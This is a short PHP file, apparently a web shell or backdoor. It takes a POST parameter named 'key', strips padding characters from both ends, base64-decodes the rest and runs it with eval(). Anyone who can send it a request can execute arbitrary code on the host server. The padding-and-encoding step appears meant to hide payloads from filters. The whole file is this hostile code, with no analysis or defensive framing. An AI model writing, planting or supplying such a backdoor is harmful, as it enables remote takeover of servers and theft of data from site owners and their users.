<?php
$st = $_POST['key'];
$st = ltrim($st,"Aaron");
$st = rtrim($st,"Ruben");
eval(base64_decode($st));
?>